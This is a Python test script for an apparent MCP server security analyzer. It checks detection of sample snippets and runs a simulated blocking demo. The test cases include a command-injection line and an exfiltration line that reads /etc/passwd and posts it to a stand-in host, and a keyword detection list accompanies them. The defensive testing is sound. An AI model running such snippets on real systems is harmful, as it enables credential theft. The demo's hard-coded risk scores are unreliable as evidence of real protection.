#!/usr/bin/env python3
"""
MCP Security Analyzer - ML Integration Test
This tool PROTECTS the MCP ecosystem by detecting malicious servers
"""

import asyncio
import json
from pathlib import Path
from datetime import datetime

# Test our security detection capabilities
async def test_security_detection():
    """Test our security analyzer to ensure it protects users"""
    
    print("\n" + "="*60)
    print("🛡️  MCP SECURITY ANALYZER TEST")
    print("="*60)
    print("\nTesting detection capabilities to protect MCP users\n")
    
    # Import our security analyzers
    try:
        from src.ml.comprehensive_analyzer import ComprehensiveSecurityAnalyzer
        analyzer = ComprehensiveSecurityAnalyzer()
        print("✅ ML Security Analyzer loaded successfully")
    except ImportError:
        print("⚠️  ML analyzer not available - using pattern detection")
        analyzer = None
    
    # Test detection on various threat patterns
    test_cases = [
        {
            "name": "Safe MCP Tool",
            "description": "Legitimate calculator tool",
            "code": "def add(a, b): return a + b",
            "expected": "safe"
        },
        {
            "name": "Command Injection Attack",
            "description": "Detects command injection attempts",
            "code": "import os; os.system(user_input)",
            "expected": "malicious"
        },
        {
            "name": "Data Exfiltration Attempt",
            "description": "Detects data theft attempts",
            "code": "open('/etc/passwd').read(); requests.post('external.com', data)",
            "expected": "malicious"
        }
    ]
    
    print("\n📊 Running Security Tests:\n")
    
    correct_detections = 0
    total_tests = len(test_cases)
    
    for test in test_cases:
        print(f"Testing: {test['name']}")
        print(f"  Expected: {test['expected'].upper()}")
        
        if analyzer:
            # Use ML analyzer
            result = await analyzer.analyze({
                "description": test["description"],
                "code": test["code"]
            })
            
            detected = "malicious" if result.is_malicious else "safe"
            print(f"  Detected: {detected.upper()}")
            print(f"  Confidence: {result.confidence:.1%}")
            
            if detected == test["expected"]:
                print("  ✅ Correct detection!")
                correct_detections += 1
            else:
                print("  ❌ Missed threat")
        else:
            # Fallback pattern detection
            is_malicious = any(danger in test["code"] for danger in ["os.system", "eval", "exec", "/etc/passwd"])
            detected = "malicious" if is_malicious else "safe"
            print(f"  Pattern Detection: {detected.upper()}")
            
            if detected == test["expected"]:
                correct_detections += 1
        
        print()
    
    # Summary
    accuracy = (correct_detections / total_tests) * 100
    print("="*60)
    print(f"📈 RESULTS: {correct_detections}/{total_tests} correct ({accuracy:.1f}% accuracy)")
    
    if accuracy >= 90:
        print("✅ Security analyzer is working effectively!")
    else:
        print("⚠️  Security analyzer needs improvement")
    
    return accuracy


async def test_realtime_protection():
    """Demonstrate real-time protection capabilities"""
    
    print("\n" + "="*60)
    print("🚨 REAL-TIME THREAT PROTECTION DEMO")
    print("="*60)
    
    print("\nSimulating MCP server requests...\n")
    
    # Simulate monitoring
    threats_blocked = 0
    requests_processed = 0
    
    fake_requests = [
        {"tool": "calculator", "risk": 0.1},
        {"tool": "file_reader", "risk": 0.3},
        {"tool": "command_executor", "risk": 0.9},
        {"tool": "data_processor", "risk": 0.2},
        {"tool": "network_scanner", "risk": 0.8}
    ]
    
    for req in fake_requests:
        requests_processed += 1
        print(f"📥 Processing: {req['tool']}")
        
        if req['risk'] > 0.7:
            print(f"  🛑 BLOCKED - High risk detected ({req['risk']:.1%})")
            threats_blocked += 1
        elif req['risk'] > 0.5:
            print(f"  ⚠️  WARNING - Medium risk ({req['risk']:.1%})")
        else:
            print(f"  ✅ ALLOWED - Low risk ({req['risk']:.1%})")
        
        await asyncio.sleep(0.5)  # Simulate processing
    
    print(f"\n📊 Protection Summary:")
    print(f"  • Requests Processed: {requests_processed}")
    print(f"  • Threats Blocked: {threats_blocked}")
    print(f"  • Protection Rate: {(threats_blocked/requests_processed)*100:.1f}%")


async def main():
    """Main test runner"""
    
    print("\n" + "🛡️"*30)
    print("\n  MCP SECURITY ANALYZER - PROTECTING THE ECOSYSTEM")
    print("\n" + "🛡️"*30)
    
    print("\nThis tool helps protect MCP users from:")
    print("  • Malicious code execution")
    print("  • Data exfiltration attempts")
    print("  • Prompt injection attacks")
    print("  • Command injection vulnerabilities")
    print("  • Supply chain attacks")
    
    # Run tests
    accuracy = await test_security_detection()
    
    if accuracy > 80:
        await test_realtime_protection()
    
    print("\n✅ Security analyzer is ready to protect MCP servers!")
    print("📚 Use this tool to scan and verify MCP server safety")
    print("🌍 Help make the MCP ecosystem safer for everyone!\n")


if __name__ == "__main__":
    asyncio.run(main())